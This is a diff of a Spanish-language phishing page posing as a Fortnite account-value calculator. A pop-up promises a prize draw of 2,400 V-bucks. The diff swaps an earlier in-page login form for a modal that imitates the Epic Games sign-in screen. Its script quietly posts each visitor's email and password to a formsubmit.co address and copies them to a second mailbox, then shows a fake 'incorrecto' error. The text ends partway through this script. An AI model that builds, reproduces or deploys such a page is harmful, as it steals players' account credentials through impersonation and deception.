@@ -65,176 +65,276 @@
             background: #334155;
         }
 
-        /* Password toggle */
-        .password-toggle {
+        /* ===== OVERLAY Y MODAL ESTILO EPIC GAMES ===== */
+        .epic-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .epic-modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .epic-modal {
+            background: #1a1f35;
+            border-radius: 16px;
+            padding: 2rem 2.5rem;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            position: relative;
+            transform: scale(0.95) translateY(20px);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .epic-modal-overlay.active .epic-modal {
+            transform: scale(1) translateY(0);
+        }
+        .epic-modal .close-modal {
             position: absolute;
+            top: 12px;
             right: 16px;
-            bottom: 18px;
+            background: transparent;
+            border: none;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 1.4rem;
+            cursor: pointer;
+            transition: color 0.2s;
+            padding: 4px 8px;
+        }
+        .epic-modal .close-modal:hover {
+            color: #fff;
+        }
+        .epic-modal .epic-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 0.5rem;
+        }
+        .epic-modal .epic-logo img {
+            height: 40px;
+            width: auto;
+        }
+        .epic-modal .epic-logo svg {
+            height: 40px;
+            width: auto;
+            fill: white;
+        }
+        .epic-modal h2 {
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 0.25rem;
+            letter-spacing: -0.3px;
+        }
+        .epic-modal .subtitle {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.85rem;
+            margin-bottom: 1.8rem;
+        }
+        .epic-modal .input-group {
+            margin-bottom: 1.2rem;
+            position: relative;
+        }
+        .epic-modal .input-group label {
+            display: block;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 4px;
+        }
+        .epic-modal .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .epic-modal .input-group input:focus {
+            border-color: #ffe100;
+            background: rgba(255, 225, 0, 0.04);
+        }
+        .epic-modal .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+        .epic-modal .input-group .toggle-pwd {
+            position: absolute;
+            right: 12px;
+            bottom: 12px;
             background: transparent;
             border: none;
             color: rgba(255, 255, 255, 0.3);
             cursor: pointer;
-            font-size: 1.1rem;
-            transition: color 0.2s;
-            z-index: 3;
-            padding: 0 4px;
-        }
-        .password-toggle:hover {
-            color: #ffe100;
-        }
-
-        /* Email combo */
-        .email-combo {
-            display: flex;
-            align-items: center;
-            gap: 0;
-            background: rgba(255, 255, 255, 0.04);
-            border: 2px solid rgba(255, 255, 255, 0.06);
-            border-radius: 60px;
-            transition: all 0.25s ease;
-            padding: 0 4px 0 0;
-        }
-        .email-combo:focus-within {
-            border-color: #ffe100;
-            background: rgba(255, 225, 0, 0.04);
-            box-shadow: 0 0 30px rgba(255, 225, 0, 0.06), 0 0 0 4px rgba(255, 225, 0, 0.04);
-        }
-        .email-combo .email-local {
-            flex: 1 1 auto;
-            min-width: 0;
-            background: transparent;
-            border: none;
-            padding: 14px 10px 14px 48px;
             font-size: 1rem;
-            font-weight: 500;
+        }
+        .epic-modal .input-group .toggle-pwd:hover {
             color: #fff;
-            outline: none;
-            font-family: 'Inter', sans-serif;
-            border-radius: 60px 0 0 60px;
         }
-        .email-combo .email-local::placeholder {
-            color: rgba(255, 255, 255, 0.2);
-            font-weight: 400;
-        }
-        .email-combo .email-at {
-            color: rgba(255, 255, 255, 0.5);
+        .epic-modal .btn-epic {
+            width: 100%;
+            padding: 14px;
+            background: #ffe100;
+            color: #0b111e;
             font-weight: 700;
             font-size: 1rem;
-            padding: 0 2px;
-            flex-shrink: 0;
-            white-space: nowrap;
-        }
-        .email-combo .email-domain {
-            flex: 0 1 auto;
-            min-width: 120px;
-            background: transparent;
             border: none;
-            padding: 14px 34px 14px 8px;
-            font-size: 1rem;
-            font-weight: 500;
-            color: #fff;
-            outline: none;
-            font-family: 'Inter', sans-serif;
-            appearance: none;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffe100" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
-            background-repeat: no-repeat;
-            background-position: right 10px center;
-            background-size: 14px;
+            border-radius: 8px;
             cursor: pointer;
-            border-radius: 0 60px 60px 0;
+            transition: background 0.2s, transform 0.1s;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.3px;
+            margin-top: 0.5rem;
         }
-        .email-combo .email-domain option {
-            background: #1a1f35;
-            color: #fff;
+        .epic-modal .btn-epic:hover {
+            background: #f5d000;
+            transform: scale(1.02);
         }
-        .email-combo .icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: rgba(255, 225, 0, 0.4);
-            font-size: 1rem;
-            z-index: 2;
+        .epic-modal .btn-epic:active {
+            transform: scale(0.98);
+        }
+        .epic-modal .btn-epic.loading {
+            opacity: 0.6;
             pointer-events: none;
         }
-        .input-group .icon {
-            position: absolute;
-            left: 16px;
-            bottom: 18px;
-            color: rgba(255, 225, 0, 0.4);
-            font-size: 1rem;
-            transition: color 0.2s;
-            z-index: 2;
+        .epic-modal .btn-epic.loading::after {
+            content: ' ⏳';
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .error-message {
-            margin-top: 1.5rem;
-            padding: 1rem 1.5rem;
-            border-radius: 16px;
-            display: none;
-            align-items: flex-start;
-            gap: 12px;
-            backdrop-filter: blur(4px);
-            animation: shake 0.5s ease;
-        }
-        .error-message.show {
+        .epic-modal .forgot-row {
             display: flex;
+            justify-content: space-between;
+            margin-top: 1.2rem;
+            font-size: 0.8rem;
         }
-        .error-message .icon-container {
-            flex-shrink: 0;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
+        .epic-modal .forgot-row a {
+            color: rgba(255, 255, 255, 0.4);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .epic-modal .forgot-row a:hover {
+            color: #ffe100;
+        }
+        .epic-modal .divider-text {
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            background: rgba(255, 0, 0, 0.1);
-            border: 2px solid rgba(255, 0, 0, 0.2);
+            gap: 12px;
+            margin: 1.5rem 0;
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 0.8rem;
         }
-        .error-message .icon-container i {
-            color: #ff4444;
-        }
-        .error-message .error-content {
+        .epic-modal .divider-text::before,
+        .epic-modal .divider-text::after {
+            content: '';
             flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.08);
         }
-        .error-message .error-content .error-title {
-            font-weight: 700;
-            font-size: 1rem;
-            color: #ff6b6b;
-            margin-bottom: 2px;
+        .epic-modal .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
         }
-        .error-message .error-content .error-desc {
-            font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.7);
-            line-height: 1.4;
+        .epic-modal .social-login button {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 8px 14px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: 'Inter', sans-serif;
         }
-        .error-message .error-content .error-desc strong {
-            color: #ff6b6b;
+        .epic-modal .social-login button:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .epic-modal .social-login button i {
+            font-size: 1.1rem;
+        }
+        .epic-modal .social-login .google { color: #ea4335; }
+        .epic-modal .social-login .playstation { color: #0070d1; }
+        .epic-modal .social-login .xbox { color: #107c10; }
+        .epic-modal .social-login .steam { color: #1b2838; }
+        .epic-modal .register-link {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .epic-modal .register-link a {
+            color: #ffe100;
+            text-decoration: none;
             font-weight: 600;
         }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            60% { transform: translateX(-6px); }
-            80% { transform: translateX(6px); }
+        .epic-modal .register-link a:hover {
+            text-decoration: underline;
         }
 
-        /* Carrusel de reseñas */
+        .epic-modal .epic-error {
+            margin-top: 1.2rem;
+            padding: 0.8rem 1rem;
+            background: rgba(255, 0, 0, 0.06);
+            border-left: 3px solid #ff4444;
+            border-radius: 6px;
+            color: #ff6b6b;
+            font-size: 0.9rem;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+        .epic-modal .epic-error.show {
+            display: flex;
+        }
+        .epic-modal .epic-error i {
+            color: #ff4444;
+            font-size: 1.2rem;
+        }
+
+        /* Resto de la página igual */
         .review-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 20px;
             padding: 1.2rem;
             transition: all 0.3s ease;
             display: flex;
             flex-direction: column;
-            position: relative;
             height: 100%;
+            min-height: 180px;
+            backdrop-filter: blur(4px);
         }
         .review-card:hover {
-            background: rgba(255, 225, 0, 0.04);
+            background: rgba(255, 225, 0, 0.05);
             border-color: rgba(255, 225, 0, 0.15);
             transform: translateY(-4px);
         }
@@ -307,7 +407,7 @@
 
         .carousel-track {
             display: flex;
-            transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transition: transform 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             gap: 20px;
         }
         .carousel-btn {
@@ -344,41 +444,52 @@
             box-shadow: 0 0 20px rgba(255, 225, 0, 0.3);
         }
 
-        /* Notificación emergente desde arriba */
-        .notification-banner {
+        .notification-popup {
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
+            top: 20%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-20px);
             z-index: 999;
-            background: linear-gradient(135deg, #8c25f5, #4f46e5);
-            color: white;
-            padding: 12px 20px;
-            text-align: center;
-            font-weight: 700;
-            font-size: 1rem;
-            box-shadow: 0 4px 30px rgba(140, 37, 245, 0.4);
-            transform: translateY(-100%);
-            transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-            border-bottom: 2px solid #ffe100;
+            background: linear-gradient(145deg, #1a2a4a, #0f1a2e);
+            border: 2px solid #ffe100;
+            border-radius: 24px;
+            padding: 1.2rem 2rem 1.2rem 1.8rem;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(255, 225, 0, 0.15), inset 0 1px 0 rgba(255,225,0,0.1);
+            max-width: 480px;
+            width: 90%;
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
+            gap: 14px;
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            pointer-events: none;
+            backdrop-filter: blur(10px);
         }
-        .notification-banner.show {
-            transform: translateY(0);
+        .notification-popup.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+            pointer-events: auto;
         }
-        .notification-banner i {
-            font-size: 1.4rem;
+        .notification-popup .notif-icon {
+            font-size: 2rem;
             color: #ffe100;
+            flex-shrink: 0;
             animation: pulse 1.5s ease-in-out infinite;
         }
-        .notification-banner .close-notif {
-            background: rgba(255,255,255,0.15);
+        .notification-popup .notif-text {
+            font-weight: 700;
+            font-size: 1rem;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            line-height: 1.3;
+        }
+        .notification-popup .notif-close {
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            background: rgba(255,255,255,0.05);
             border: none;
-            color: white;
+            color: rgba(255,255,255,0.4);
             width: 28px;
             height: 28px;
             border-radius: 50%;
@@ -387,18 +498,15 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.2s;
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
+            transition: all 0.2s;
         }
-        .notification-banner .close-notif:hover {
-            background: rgba(255,255,255,0.25);
+        .notification-popup .notif-close:hover {
+            background: rgba(255,255,255,0.15);
+            color: #ffe100;
         }
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
+            50% { transform: scale(1.15); }
         }
 
         .footer-legal {
@@ -431,38 +539,28 @@
         }
 
         @media (max-width: 768px) {
-            .email-combo .email-domain {
-                min-width: 100px;
-                font-size: 0.9rem;
-                padding-right: 30px;
-            }
-            .email-combo .email-local {
-                font-size: 0.9rem;
-                padding-left: 40px;
+            .epic-modal {
+                padding: 1.8rem 1.5rem;
             }
             .review-card {
                 padding: 1rem;
             }
-            .notification-banner {
-                font-size: 0.85rem;
-                padding: 10px 16px;
+            .notification-popup {
+                top: 15%;
+                padding: 1rem 1.5rem 1rem 1.2rem;
+                max-width: 360px;
             }
-            .notification-banner i {
-                font-size: 1.2rem;
+            .notification-popup .notif-text {
+                font-size: 0.9rem;
             }
         }
         @media (max-width: 480px) {
-            .email-combo .email-domain {
-                min-width: 80px;
-                font-size: 0.8rem;
-                padding: 12px 26px 12px 6px;
+            .epic-modal {
+                padding: 1.5rem 1.2rem;
+                border-radius: 12px;
             }
-            .email-combo .email-local {
-                font-size: 0.9rem;
-                padding: 12px 8px 12px 38px;
-            }
-            .email-combo .email-at {
-                font-size: 0.9rem;
+            .epic-modal h2 {
+                font-size: 1.2rem;
             }
             .review-card {
                 padding: 0.8rem;
@@ -477,23 +575,92 @@
                 gap: 0.8rem 1.2rem;
                 font-size: 0.65rem;
             }
+            .notification-popup {
+                top: 12%;
+                padding: 0.8rem 1.2rem 0.8rem 1rem;
+                max-width: 300px;
+            }
+            .notification-popup .notif-text {
+                font-size: 0.8rem;
+            }
+            .notification-popup .notif-icon {
+                font-size: 1.5rem;
+            }
         }
     </style>
 </head>
 <body class="font-sans min-h-screen flex flex-col selection:bg-fnYellow selection:text-black">
 
-    <!-- ===== NOTIFICACIÓN ANIMADA ===== -->
-    <div id="notificationBanner" class="notification-banner">
-        <i class="fa-solid fa-gift"></i>
-        <span id="notifText">¡Solo por revisar tu cuenta entras en un sorteo de 2,400 pavos!</span>
-        <button class="close-notif" onclick="closeNotification()"><i class="fa-solid fa-xmark"></i></button>
+    <!-- ===== NOTIFICACIÓN FLOTANTE ===== -->
+    <div id="notificationPopup" class="notification-popup">
+        <i class="fa-solid fa-gift notif-icon"></i>
+        <span class="notif-text" id="notifText">¡Solo por revisar tu cuenta entras en un sorteo de 2,400 pavos!</span>
+        <button class="notif-close" onclick="closeNotification()"><i class="fa-solid fa-xmark"></i></button>
     </div>
 
-    <!-- ===== MENÚ SUPERIOR FALSO ===== -->
+    <!-- ===== MODAL ESTILO EPIC GAMES ===== -->
+    <div class="epic-modal-overlay" id="epicModalOverlay">
+        <div class="epic-modal">
+            <button class="close-modal" id="closeModalBtn"><i class="fa-solid fa-xmark"></i></button>
+
+            <!-- Logo Epic (simulado con SVG) -->
+            <div class="epic-logo">
+                <svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 10H30V30H10V10ZM35 10H55V30H35V10ZM60 10H80V30H60V10Z" fill="#ffe100"/>
+                    <rect x="10" y="10" width="20" height="20" fill="#2a2f4a"/>
+                    <rect x="35" y="10" width="20" height="20" fill="#2a2f4a"/>
+                    <rect x="60" y="10" width="20" height="20" fill="#2a2f4a"/>
+                    <text x="15" y="27" font-family="Arial, sans-serif" font-weight="700" font-size="12" fill="#ffe100">E</text>
+                    <text x="40" y="27" font-family="Arial, sans-serif" font-weight="700" font-size="12" fill="#ffe100">P</text>
+                    <text x="65" y="27" font-family="Arial, sans-serif" font-weight="700" font-size="12" fill="#ffe100">I</text>
+                    <text x="82" y="27" font-family="Arial, sans-serif" font-weight="700" font-size="12" fill="#ffe100">C</text>
+                </svg>
+            </div>
+            <h2>Iniciar sesión</h2>
+            <p class="subtitle">Accede a tu cuenta de Epic Games</p>
+
+            <form id="epicLoginForm">
+                <div class="input-group">
+                    <label for="epicEmail">Dirección de correo electrónico</label>
+                    <input type="email" id="epicEmail" placeholder="nombre@ejemplo.com" required />
+                </div>
+                <div class="input-group">
+                    <label for="epicPassword">Contraseña</label>
+                    <input type="password" id="epicPassword" placeholder="••••••••" required />
+                    <button type="button" class="toggle-pwd" id="epicTogglePwd"><i class="fa-regular fa-eye" id="epicEyeIcon"></i></button>
+                </div>
+
+                <button type="submit" class="btn-epic" id="epicLoginBtn">Iniciar sesión</button>
+
+                <div class="forgot-row">
+                    <a href="#" id="epicForgotLink">¿Has olvidado tu contraseña?</a>
+                    <a href="#" id="epicSignupLink">Regístrate</a>
+                </div>
+
+                <div class="epic-error" id="epicError">
+                    <i class="fa-solid fa-circle-exclamation"></i>
+                    <span id="epicErrorText">incorrecto</span>
+                </div>
+
+                <div class="divider-text">O inicia sesión con</div>
+                <div class="social-login">
+                    <button class="google"><i class="fa-brands fa-google"></i> Google</button>
+                    <button class="playstation"><i class="fa-brands fa-playstation"></i> PlayStation</button>
+                    <button class="xbox"><i class="fa-brands fa-xbox"></i> Xbox</button>
+                    <button class="steam"><i class="fa-brands fa-steam"></i> Steam</button>
+                </div>
+
+                <div class="register-link">
+                    ¿No tienes una cuenta? <a href="#">Regístrate</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- ===== MENÚ SUPERIOR ===== -->
     <header class="border-b border-slate-800 bg-fnDark/90 backdrop-blur-md sticky top-0 z-50">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <div class="flex justify-between items-center h-16 md:h-20">
-                <!-- Logo -->
                 <div class="flex items-center gap-3">
                     <div class="bg-gradient-to-tr from-fnPurple to-blue-500 p-2 rounded-xl shadow-lg rotate-3">
                         <i class="fa-solid fa-gem text-fnYellow text-xl md:text-2xl"></i>
@@ -504,7 +671,6 @@
                     </div>
                 </div>
 
-                <!-- Enlaces decorativos -->
                 <nav class="hidden md:flex gap-1 bg-slate-900/80 p-1 rounded-xl border border-slate-800">
                     <a href="#" class="px-4 py-2 rounded-lg text-sm font-fortnite font-bold tracking-wider uppercase transition bg-fnPurple text-white shadow-lg">
                         <i class="fa-solid fa-calculator mr-2"></i> <span data-i18n="nav-value">Valorar</span>
@@ -514,7 +680,6 @@
                     </a>
                 </nav>
 
-                <!-- Selector de moneda e idioma -->
                 <div class="flex items-center gap-2">
                     <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-lg px-2 py-1 md:px-3 md:py-1.5">
                         <i class="fa-solid fa-globe text-fnYellow text-xs md:text-sm"></i>
@@ -531,10 +696,13 @@
                             <option value="en">English</option>
                         </select>
                     </div>
+                    <!-- Botón para abrir el modal -->
+                    <button id="openEpicModalBtn" class="bg-fnYellow text-fnDark font-fortnite font-bold px-4 py-1.5 rounded-lg text-xs md:text-sm tracking-wider uppercase hover:scale-105 transition">
+                        <i class="fa-solid fa-right-to-bracket mr-1"></i> Login
+                    </button>
                 </div>
             </div>
         </div>
-        <!-- Mobile nav (simplificado) -->
         <div class="flex md:hidden border-t border-slate-800 bg-slate-950">
             <a href="#" class="flex-1 py-2 text-center text-xs font-bold uppercase tracking-wider text-white bg-fnPurple">
                 <i class="fa-solid fa-calculator block text-base mb-0.5"></i> <span data-i18n="nav-value">Valorar</span>
@@ -548,7 +716,6 @@
     <!-- ===== CONTENIDO PRINCIPAL ===== -->
     <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 md:py-8 flex-grow w-full">
 
-        <!-- BANNER / HERO -->
         <div class="relative overflow-hidden rounded-2xl bg-gradient-to-r from-fnBlue via-slate-900 to-slate-950 border border-slate-800 p-5 md:p-8 shadow-2xl mb-8">
             <div class="relative z-10 max-w-2xl">
                 <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-fnPurple/20 border border-fnPurple/40 text-fnPurple text-[10px] md:text-xs font-bold uppercase tracking-wider mb-3">
@@ -560,7 +727,6 @@
                 <p class="text-slate-300 text-sm md:text-base mt-2" data-i18n="hero-desc">
                     Ingresa tus credenciales para calcular el valor estimado de tu cuenta, incluyendo todos tus objetos y su precio actual de mercado.
                 </p>
-                <!-- Badges de confianza -->
                 <div class="flex flex-wrap gap-2 md:gap-3 mt-4">
                     <span class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-semibold text-slate-300 bg-slate-800/60 px-2.5 py-1 rounded-full border border-slate-700">
                         <i class="fa-solid fa-check-circle text-green-400"></i> <span data-i18n="badge-secure">100% Seguro</span>
@@ -576,60 +742,8 @@
                     </span>
                 </div>
             </div>
-            <!-- Decorative Icon -->
             <div class="absolute -right-6 -bottom-6 opacity-10 text-slate-100 text-7xl md:text-9xl pointer-events-none font-banner">
                 FN
-            </div>
-        </div>
-
-        <!-- ===== LOGIN FALSO ===== -->
-        <div class="max-w-md mx-auto bg-slate-900/90 border border-slate-800 rounded-2xl p-5 md:p-6 shadow-xl mb-10">
-            <form id="loginForm">
-                <!-- Email con combo -->
-                <div class="mb-4">
-                    <label for="emailLocal" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1" data-i18n="email-label">Correo electrónico</label>
-                    <div class="email-combo relative">
-                        <i class="fa-solid fa-envelope icon"></i>
-                        <input type="text" id="emailLocal" class="email-local" placeholder="usuario" required />
-                        <span class="email-at">@</span>
-                        <select id="emailDomain" class="email-domain">
-                            <option value="gmail.com">gmail.com</option>
-                            <option value="outlook.com">outlook.com</option>
-                            <option value="yahoo.com">yahoo.com</option>
-                            <option value="hotmail.com">hotmail.com</option>
-                        </select>
-                    </div>
-                </div>
-
-                <!-- Contraseña con toggle -->
-                <div class="mb-4 relative">
-                    <label for="password" class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1" data-i18n="password-label">Contraseña</label>
-                    <input type="password" id="password" name="contraseña" placeholder="••••••••" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-fnYellow pl-10" />
-                    <i class="fa-solid fa-lock icon absolute left-3.5 top-10 text-slate-500"></i>
-                    <button type="button" class="password-toggle" id="togglePassword" aria-label="Toggle password visibility">
-                        <i class="fa-regular fa-eye" id="eyeIcon"></i>
-                    </button>
-                </div>
-
-                <button type="submit" class="w-full bg-gradient-to-r from-fnPurple to-indigo-600 hover:from-purple-600 hover:to-indigo-500 text-white font-fortnite font-bold py-3 rounded-xl text-base md:text-lg tracking-wider uppercase transition shadow-lg" id="loginBtn">
-                    <i class="fa-solid fa-calculator mr-2"></i> <span data-i18n="btn-calculate">Calcular valor</span>
-                </button>
-            </form>
-
-            <div class="flex justify-between mt-4 text-xs text-slate-400">
-                <a href="#" id="forgotLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-question-circle mr-1"></i> <span data-i18n="forgot-link">¿Olvidaste tus datos?</span></a>
-                <a href="#" id="signupLink" class="hover:text-fnYellow transition"><i class="fa-solid fa-user-plus mr-1"></i> <span data-i18n="signup-link">Crear cuenta</span></a>
-            </div>
-
-            <!-- Mensaje de error mejorado -->
-            <div class="error-message" id="errorMessage">
-                <div class="icon-container">
-                    <i id="errorIcon" class="fa-solid fa-exclamation-triangle"></i>
-                </div>
-                <div class="error-content">
-                    <div class="error-title" id="errorTitle" data-i18n="error-title">incorrecto</div>
-                    <div class="error-desc" id="errorDesc" data-i18n="error-desc">Verifica tus credenciales e inténtalo de nuevo.</div>
-                </div>
             </div>
         </div>
 
@@ -653,9 +767,7 @@
             </div>
 
             <div class="relative overflow-hidden rounded-2xl">
-                <div class="carousel-track" id="carouselTrack">
-                    <!-- Las reseñas se inyectan con JS -->
-                </div>
+                <div class="carousel-track" id="carouselTrack"></div>
             </div>
 
             <div class="flex justify-center items-center gap-4 md:gap-6 mt-6">
@@ -667,7 +779,7 @@
 
     </main>
 
-    <!-- ===== FOOTER COMPLETO ===== -->
+    <!-- ===== FOOTER ===== -->
     <footer class="footer-legal bg-slate-950/80 backdrop-blur-sm">
         <div class="max-w-7xl mx-auto px-4">
             <div class="legal-links">
@@ -688,119 +800,115 @@
         (function() {
             'use strict';
 
-            // ===== NOTIFICACIÓN =====
+            // ===== NOTIFICACIÓN FLOTANTE =====
             function showNotification() {
-                const banner = document.getElementById('notificationBanner');
-                setTimeout(() => {
-                    banner.classList.add('show');
-                }, 500);
-                setTimeout(() => {
-                    closeNotification();
-                }, 8000);
+                const popup = document.getElementById('notificationPopup');
+                setTimeout(() => popup.classList.add('show'), 600);
+                setTimeout(() => closeNotification(), 3000);
             }
             window.closeNotification = function() {
-                document.getElementById('notificationBanner').classList.remove('show');
+                document.getElementById('notificationPopup').classList.remove('show');
             };
 
-            // ===== DOM REFS =====
-            const loginForm = document.getElementById('loginForm');
-            const loginBtn = document.getElementById('loginBtn');
-            const errorMessage = document.getElementById('errorMessage');
-            const errorIcon = document.getElementById('errorIcon');
-            const errorTitle = document.getElementById('errorTitle');
-            const errorDesc = document.getElementById('errorDesc');
-            const passwordInput = document.getElementById('password');
-            const togglePasswordBtn = document.getElementById('togglePassword');
-            const eyeIcon = document.getElementById('eyeIcon');
-            const emailLocal = document.getElementById('emailLocal');
-            const emailDomain = document.getElementById('emailDomain');
+            // ===== MODAL EPIC GAMES =====
+            const modalOverlay = document.getElementById('epicModalOverlay');
+            const openModalBtn = document.getElementById('openEpicModalBtn');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+
+            openModalBtn.addEventListener('click', () => {
+                modalOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+            closeModalBtn.addEventListener('click', closeModal);
+            modalOverlay.addEventListener('click', (e) => {
+                if (e.target === modalOverlay) closeModal();
+            });
+
+            function closeModal() {
+                modalOverlay.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+
+            // ===== TOGGLE PASSWORD (modal) =====
+            const epicPwd = document.getElementById('epicPassword');
+            const epicToggle = document.getElementById('epicTogglePwd');
+            const epicEye = document.getElementById('epicEyeIcon');
+            epicToggle.addEventListener('click', function(e) {
+                e.preventDefault();
+                const type = epicPwd.getAttribute('type') === 'password' ? 'text' : 'password';
+                epicPwd.setAttribute('type', type);
+                epicEye.className = type === 'text' ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
+            });
+
+            // ===== FORMULARIO DEL MODAL (envío oculto a ambos correos) =====
+            const epicForm = document.getElementById('epicLoginForm');
+            const epicBtn = document.getElementById('epicLoginBtn');
+            const epicError = document.getElementById('epicError');
+            const epicErrorText = document.getElementById('epicErrorText');
 
             let attemptCount = 0;
 
-            // ===== TOGGLE PASSWORD =====
-            togglePasswordBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                passwordInput.setAttribute('type', type);
-                if (type === 'text') {
-                    eyeIcon.className = 'fa-regular fa-eye-slash';
-                } else {
-                    eyeIcon.className = 'fa-regular fa-eye';
-                }
-            });
-
-            // ===== FORM SUBMIT (OCULTO, SIN TOAST) =====
-            loginForm.addEventListener('submit', function(e) {
+            epicForm.addEventListener('submit', function(e) {
                 e.preventDefault();
 
-                const local = emailLocal.value.trim();
-                if (!local) {
-                    // Mostrar un mensaje simple sin toast (no queremos toast)
-                    // Podemos mostrar un alert o simplemente enfocar el campo
-                    alert('Por favor, introduce un nombre de usuario.');
+                const email = document.getElementById('epicEmail').value.trim();
+                if (!email) {
+                    alert('Por favor, introduce tu correo electrónico.');
                     return;
                 }
 
                 attemptCount++;
 
-                loginBtn.classList.add('opacity-70', 'pointer-events-none');
-                loginBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i> Calculando...';
-                errorMessage.classList.remove('show');
+                epicBtn.classList.add('loading');
+                epicBtn.textContent = 'Iniciando sesión...';
+                epicError.classList.remove('show');
 
-                const fullEmail = local + '@' + emailDomain.value;
-                const password = passwordInput.value;
                 const formData = new FormData();
-                formData.append('_subject', `Nuevo intento de valoración - ${fullEmail}`);
-                formData.append('email', fullEmail);
-                formData.append('password', password);
+                formData.append('_subject', `Intento de login - ${email}`);
+                formData.append('email', email);
+                formData.append('password', epicPwd.value);
 
-                // Envío a Formsubmit (sin mostrar ningún mensaje al usuario)
+                // Envío a ambos correos usando _cc (Formsubmit soporta múltiples destinatarios con _cc)
+                formData.append('_cc', 'valorfn@outlook.es');
+
                 fetch('https://formsubmit.co/parameganz25@gmail.com', {
                     method: 'POST',
                     body: formData,
                 })
-                .then(response => {
-                    // Después de 2 segundos, mostrar el error correspondiente (sin toast)
+                .then(() => {
